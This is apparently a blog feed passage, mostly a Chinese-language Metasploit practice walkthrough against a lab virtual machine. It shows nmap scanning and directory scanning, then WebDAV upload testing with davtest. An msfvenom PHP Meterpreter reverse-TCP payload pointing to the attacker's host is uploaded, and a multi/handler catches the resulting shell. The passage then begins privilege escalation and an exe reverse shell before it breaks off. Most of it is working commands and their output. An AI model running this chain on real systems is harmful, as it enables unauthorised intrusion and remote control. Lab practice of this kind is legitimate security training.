      &lt;h1 id=&quot;内网穿透&quot;&gt;&lt;a href=&quot;#内网穿透&quot; class=&quot;headerlink&quot; title=&quot;内网穿透&quot;&gt;&lt;/a&gt;内网穿透&lt;/h1&gt;&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;IP地址&lt;/th&gt;
&lt;th&gt;备注&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;192.168.117.44&lt;/td&gt;
&lt;td&gt;主机&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;192.168.96.243&lt;/td&gt;
&lt;td&gt;虚拟机(桥接)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;192.168.75.131&lt;/td&gt;
&lt;td&gt;虚拟机(NAT)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://cy9nusg4rd3n.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="https://cy9nusg4rd3n.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="SQL" scheme="https://cy9nusg4rd3n.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>metasploit渗透流程练习</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/01/25/metasploit%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/01/25/metasploit渗透流程练习/</id>
    <published>2019-01-25T09:58:38.000Z</published>
    <updated>2020-04-18T03:23:58.911Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="metasploit学习"><a href="#metasploit学习" class="headerlink" title="metasploit学习"></a>metasploit学习</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><ol><li><strong>测试靶机主要为192.168.114.29,攻击机为192.168.114.176</strong><blockquote><p>db_nmap -v -n -sn 192.168.114.0/24</p></blockquote></li></ol><a id="more"></a><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">Nmap:</span> Starting Nmap <span class="number">7.60</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2019-01-23 11:36 CST</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Initiating ARP Ping Scan at <span class="number">11</span>:<span class="number">36</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Scanning <span class="number">255</span> hosts [<span class="number">1</span> port/host]</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[*] <span class="string">Nmap:</span> Host is up.</span><br><span class="line">[*] <span class="string">Nmap:</span> Read data files <span class="string">from:</span> <span class="regexp">/usr/</span>bin<span class="regexp">/../</span>share/nmap</span><br><span class="line">[*] <span class="string">Nmap:</span> Nmap <span class="string">done:</span> <span class="number">256</span> IP addresses (<span class="number">63</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.80</span> seconds</span><br><span class="line">[*] <span class="string">Nmap:</span> Raw packets <span class="string">sent:</span> <span class="number">493</span> (<span class="number">13.804</span>KB) | <span class="string">Rcvd:</span> <span class="number">105</span> (<span class="number">2.940</span>KB)</span><br></pre></td></tr></table></figure><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ol start="2"><li><p>利用msf的db_namp端口扫描</p><blockquote><p>db_nmap -sV -n -v –open -sS -p0-10000 192.168.114.29</p></blockquote></li><li><p>发现开放端口(主要测试8585)</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">Nmap:</span> PORT     STATE SERVICE     VERSION</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">22</span>/tcp   open  ssh         OpenSSH <span class="number">7.1</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">1617</span>/tcp open  rmiregistry Java RMI</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">3000</span>/tcp open  http        WEBrick httpd <span class="number">1.3</span><span class="number">.1</span> (Ruby <span class="number">2.3</span><span class="number">.3</span> (<span class="number">2016</span><span class="number">-11</span><span class="number">-21</span>))</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">4848</span><span class="regexp">/tcp open  ssl/</span>http    Oracle GlassFish <span class="number">4.0</span> (Servlet <span class="number">3.1</span>; JSP <span class="number">2.3</span>; Java <span class="number">1.8</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">5985</span><span class="regexp">/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/</span>UPnP)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8020</span>/tcp open  http        Apache httpd</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8027</span>/tcp open  unknown</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8080</span>/tcp open  http        Oracle GlassFish <span class="number">4.0</span> (Servlet <span class="number">3.1</span>; JSP <span class="number">2.3</span>; Java <span class="number">1.8</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8282</span><span class="regexp">/tcp open  http        Apache Tomcat/</span>Coyote JSP engine <span class="number">1.1</span></span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8383</span><span class="regexp">/tcp open  ssl/</span>http    Apache httpd</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8585</span><span class="regexp">/tcp open  http        Apache httpd 2.2.21 ((Win64) PHP/</span><span class="number">5.3</span><span class="number">.10</span> DAV/<span class="number">2</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">9200</span>/tcp open  http        Elasticsearch REST API <span class="number">1.1</span><span class="number">.1</span> (<span class="string">name:</span> Jean Grey-Summers; Lucene <span class="number">4.7</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> MAC <span class="string">Address:</span> <span class="number">00</span>:<span class="number">0</span><span class="string">C:</span><span class="number">29</span>:<span class="string">E5:</span><span class="string">F7:</span><span class="number">74</span> (VMware)</span><br><span class="line">[*] <span class="string">Nmap:</span> Service <span class="string">Info:</span> <span class="string">OS:</span> Windows; <span class="string">CPE:</span> <span class="string">cpe:</span>/<span class="string">o:</span><span class="string">microsoft:</span>windows</span><br><span class="line">[*] <span class="string">Nmap:</span> Read data files <span class="string">from:</span> <span class="regexp">/usr/</span>bin<span class="regexp">/../</span>share/nmap</span><br><span class="line">[*] <span class="string">Nmap:</span> Service detection performed. Please report any incorrect results at <span class="string">https:</span><span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2837.85</span> seconds</span><br><span class="line">[*] <span class="string">Nmap:</span> Raw packets <span class="string">sent:</span> <span class="number">41973</span> (<span class="number">1.847</span>MB) | <span class="string">Rcvd:</span> <span class="number">2269</span> (<span class="number">110.612</span>KB)</span><br></pre></td></tr></table></figure></li></ol><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ol start="4"><li><p>基于msf的dir_scanner</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search dir_scan</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   ----                                ---------------  ----    -----  -----------</span><br><span class="line">   auxiliary/scanner/http/dir_scanner                   <span class="built-in">normal</span>  <span class="keyword">Yes</span>    HTTP Directory Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/scanner/http/dir_scanner </span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/http/dir_scanner):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                                          Required  Description</span><br><span class="line">   ----        ---------------                                          --------  -----------</span><br><span class="line">   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  <span class="keyword">no</span>        Path of word dictionary to use</span><br><span class="line">   PATH        /                                                        <span class="keyword">yes</span>       The path  to identify <span class="keyword">files</span></span><br><span class="line">   Proxies                                                              <span class="keyword">no</span>        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                                               <span class="keyword">yes</span>       The target address range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT       <span class="number">80</span>                                                       <span class="keyword">yes</span>       The target port (TCP)</span><br><span class="line">   SSL         false                                                    <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   THREADS     <span class="number">1</span>                                                        <span class="keyword">yes</span>       The number of concurrent threads</span><br><span class="line">   VHOST                                                                <span class="keyword">no</span>        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="keyword">set</span> threads <span class="comment">30</span></span><br><span class="line">threads <span class="comment">=&gt; 30</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set rhosts 192.168.114.29</span></span><br><span class="line">rhosts <span class="comment">=&gt; 192.168.114.29</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set rport 8585</span></span><br><span class="line">rport <span class="comment">=&gt; 8585</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; run</span></span><br><span class="line"></span><br><span class="line">[*] Detecting <span class="comment">error code</span></span><br><span class="line">[*] Using <span class="comment">code</span> <span class="comment">'404'</span><span class="comment"> as not found for 192.168.114.29</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/.../<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/cgi-bin/<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/icons/<span class="comment"> 404 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/phpmyadmin/<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/uploads/<span class="comment"> 200 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/wordpress/<span class="comment"> 200 (192.168.114.29)</span></span><br><span class="line">[*] Scanned <span class="comment">1 of 1 hosts (100% complete)</span></span><br><span class="line">[*] Auxiliary <span class="comment">module execution completed</span></span><br></pre></td></tr></table></figure></li><li><p>发现文件上传路径/uploads</p><h2 id="DAVTest上传测试"><a href="#DAVTest上传测试" class="headerlink" title="DAVTest上传测试"></a>DAVTest上传测试</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http:<span class="comment">//192.168.114.29:8585/uploads</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line">NOTERandom string <span class="keyword">for</span> this session: NBIRksdIG8d</span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Creating directory</span><br><span class="line">MKCOLFAIL</span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Sending test <span class="keyword">files</span></span><br><span class="line"><span class="keyword">PUT</span>jhtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtml</span></span><br><span class="line"><span class="keyword">PUT</span>plSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.pl</span></span><br><span class="line"><span class="keyword">PUT</span>shtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtml</span></span><br><span class="line"><span class="keyword">PUT</span>txtSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line"><span class="keyword">PUT</span>aspxSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspx</span></span><br><span class="line"><span class="keyword">PUT</span>phpSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line"><span class="keyword">PUT</span>cfmSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfm</span></span><br><span class="line"><span class="keyword">PUT</span>jspSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jsp</span></span><br><span class="line"><span class="keyword">PUT</span>cgiSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgi</span></span><br><span class="line"><span class="keyword">PUT</span>htmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line"><span class="keyword">PUT</span>aspSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Checking <span class="keyword">for</span> test <span class="keyword">file</span> execution</span><br><span class="line">EXECjhtmlFAIL</span><br><span class="line">EXECplFAIL</span><br><span class="line">EXECshtmlFAIL</span><br><span class="line">EXECtxtSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line">EXECaspxFAIL</span><br><span class="line">EXECphpSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line">EXECcfmFAIL</span><br><span class="line">EXECjspFAIL</span><br><span class="line">EXECcgiFAIL</span><br><span class="line">EXEChtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line">EXECaspFAIL</span><br><span class="line"></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line">/usr/bin/davtest Summary:</span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtml</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.pl</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtml</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspx</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfm</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jsp</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgi</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br></pre></td></tr></table></figure></li><li><p>发现能成功上传txt,php,html</p><h2 id="制作php木马"><a href="#制作php木马" class="headerlink" title="制作php木马"></a>制作php木马</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=192.168.114.176 <span class="attribute">LPORT</span>=11111 -f<span class="built_in"> raw </span>&gt; ~/Desktop/11111.php</span><br><span class="line">[-] <span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::PHP <span class="keyword">from</span> the payload</span><br><span class="line">[-] <span class="literal">No</span> arch selected, selecting arch: php <span class="keyword">from</span> the payload</span><br><span class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</span><br><span class="line">Payload size: 30659 bytes</span><br></pre></td></tr></table></figure></li><li><p>上传一句话菜刀连接也行,但这里主要是基于metasploit的学习，最终远控，权限提升</p><h2 id="向目标传马"><a href="#向目标传马" class="headerlink" title="向目标传马"></a>向目标传马</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http://192.168.114.29:8585/uploads -uploadfile ~/Desktop/11111.php -uploadloc 11111.php</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http://192.168.114.29:8585/uploads</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.114.29:8585/uploads/11111.php</span><br></pre></td></tr></table></figure></li></ol><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="literal">yes</span>       The listen<span class="built_in"> address </span>(an<span class="built_in"> interface </span>may be specified)</span><br><span class="line">   LPORT  4444             <span class="literal">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 192.168.114.176</span><br><span class="line">lhost =&gt; 192.168.114.176</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 11111</span><br><span class="line">lport =&gt; 11111</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.114.176:11111</span><br></pre></td></tr></table></figure><ol start="9"><li><p>攻击机访问一下<a href="http://192.168.114.29:8585/uploads/11111.php" target="_blank" rel="noopener">http://192.168.114.29:8585/uploads/11111.php</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 1 <span class="selector-tag">opened</span> (192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.176</span><span class="selector-pseudo">:11111</span> <span class="selector-tag">-</span>&gt; 192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.29</span><span class="selector-pseudo">:53286)</span> <span class="selector-tag">at</span> 2019<span class="selector-tag">-01-23</span> 14<span class="selector-pseudo">:44</span><span class="selector-pseudo">:18</span> +0800</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt;</span><br></pre></td></tr></table></figure></li><li><p>成功弹shell</p></li></ol><h2 id="ms18-8120提权"><a href="#ms18-8120提权" class="headerlink" title="ms18_8120提权"></a>ms18_8120提权</h2><ol start="11"><li><p>查看当前用户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: LOCAL<span class="built_in"> SERVICE </span>(0)</span><br></pre></td></tr></table></figure></li><li><p>进入shell查systeminfo</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">shell</span></span><br><span class="line"><span class="selector-tag">Process</span> 4520 <span class="selector-tag">created</span>.</span><br><span class="line"><span class="selector-tag">Channel</span> 0 <span class="selector-tag">created</span>.</span><br><span class="line"><span class="selector-tag">Microsoft</span> <span class="selector-tag">Windows</span> <span class="selector-attr">[Version 6.1.7601]</span></span><br><span class="line"><span class="selector-tag">Copyright</span> (<span class="selector-tag">c</span>) 2009 <span class="selector-tag">Microsoft</span> <span class="selector-tag">Corporation</span>.  <span class="selector-tag">All</span> <span class="selector-tag">rights</span> <span class="selector-tag">reserved</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">wamp</span>\<span class="selector-tag">bin</span>\<span class="selector-tag">apache</span>\<span class="selector-tag">Apache2</span><span class="selector-class">.2</span><span class="selector-class">.21</span>&gt;<span class="selector-tag">systeminfo</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Terminate</span> <span class="selector-tag">channel</span> 0? <span class="selector-attr">[y/N]</span>  <span class="selector-tag">y</span></span><br><span class="line"><span class="selector-attr">[-]</span> <span class="selector-tag">Error</span> <span class="selector-tag">running</span> <span class="selector-tag">command</span> <span class="selector-tag">shell</span>: <span class="selector-tag">Rex</span><span class="selector-pseudo">::TimeoutError</span> <span class="selector-tag">Operation</span> <span class="selector-tag">timed</span> <span class="selector-tag">out</span>.</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">sysinfo</span></span><br><span class="line"><span class="selector-attr">[-]</span> <span class="selector-tag">Error</span> <span class="selector-tag">running</span> <span class="selector-tag">command</span> <span class="selector-tag">sysinfo</span>: <span class="selector-tag">Rex</span><span class="selector-pseudo">::TimeoutError</span> <span class="selector-tag">Operation</span> <span class="selector-tag">timed</span> <span class="selector-tag">out</span>.</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt; </span><br><span class="line"><span class="selector-attr">[*]</span> 192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.29</span> <span class="selector-tag">-</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 2 <span class="selector-tag">closed</span>.  <span class="selector-tag">Reason</span>: <span class="selector-tag">Died</span></span><br></pre></td></tr></table></figure></li><li><p>桥接模式下，因为多人共用路由网络太差了，会话很容易断，现在改为NAT模式测试</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机:<span class="number">192.168</span><span class="meta">.75</span><span class="meta">.128</span></span><br><span class="line">靶机:<span class="number">192.168</span><span class="meta">.75</span><span class="meta">.134</span></span><br></pre></td></tr></table></figure></li><li><p>构造exe反弹shell上传到靶机</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 